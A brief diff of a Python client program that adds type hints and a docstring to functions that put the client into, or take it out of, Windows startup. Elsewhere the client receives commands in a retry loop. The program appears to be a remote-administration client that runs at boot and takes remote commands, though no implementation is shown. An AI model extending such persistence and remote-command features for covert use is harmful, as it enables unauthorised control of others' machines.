@@ -176,7 +176,7 @@ def errors(ERROR, line=True) -> str:
     return error_msg
 
 
-def add_startup():
+def add_startup() -> list:
     """ Add Client to startup """
     if platform.system() != 'Windows':
         return [False, 'Startup feature is only for Windows']
@@ -196,7 +196,8 @@ def add_startup():
     return [True, None]
 
 
-def remove_startup():
+def remove_startup() -> list:
+    """ Remove Client from Startup """
     if platform.system() != 'Windows':
         return [False, 'Startup feature is only for Windows.']
     try:
@@ -604,7 +605,6 @@ def main(RETRY_TIMER : int = 30) -> None:
         client.receive_commands()
     except Exception as e:
         logging.critical(errors(e))
-
 
 
 if __name__ == '__main__':
